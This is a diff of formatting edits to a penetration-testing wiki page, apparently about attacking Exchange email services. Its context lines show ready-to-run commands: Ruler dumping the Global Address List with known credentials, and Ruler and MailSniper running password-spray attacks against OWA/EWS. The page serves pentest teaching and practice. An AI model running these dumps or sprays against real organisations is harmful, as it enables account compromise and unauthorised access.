@@ -69,7 +69,7 @@ If access to a domain-joined computer or a corporate email account is obtained, 
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-### Ruler
+#### Ruler
 
 [Ruler](https://github.com/sensepost/ruler) (Go) can be used to retreive the GAL using known credentials.
 
@@ -77,7 +77,7 @@ If access to a domain-joined computer or a corporate email account is obtained, 
 ruler -k -d target.domain -u user -p 'Passw0rd!' -e user@target.domain --verbose abk dump -o gal.txt
 ```
 
-### global-address-list-owa <a href="#mailsniper" id="mailsniper"></a>
+#### global-address-list-owa <a href="#mailsniper" id="mailsniper"></a>
 
 [global-address-list-owa](https://github.com/pigeonburger/global-address-list-owa) (Python) can also be used to export the Gal using known credentials.
 
@@ -119,7 +119,7 @@ Password spray is an attack that involves using a single password against multip
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-[Ruler](https://github.com/sensepost/ruler) (Go) can be used to perform password spray attacks&#x20;
+[Ruler](https://github.com/sensepost/ruler) (Go) can be used to perform password spray attacks
 
 ```bash
 ruler -k --domain target.domain brute --users global_address_list.txt --passwords passwords.txt --verbose -a 4
@@ -127,15 +127,13 @@ ruler -k --domain target.domain brute --users global_address_list.txt --password
 {% endtab %}
 
 {% tab title="Windows" %}
-&#x20;Using [MailSniper](https://github.com/dafthack/MailSniper), we can perform a password spray with the functions `Invoke-PasswordSprayOWA` or `Invoke-PasswordSprayEWS`.
+Using [MailSniper](https://github.com/dafthack/MailSniper), we can perform a password spray with the functions `Invoke-PasswordSprayOWA` or `Invoke-PasswordSprayEWS`.
 
 ```powershell
 Invoke-PasswordSprayOWA -ExchHostname exch01.domain.local -UserList .\usernames.txt -Password "P@ssword!" -OutFile creds.txt
 ```
 {% endtab %}
 {% endtabs %}
-
-
 
 ## Resources
 
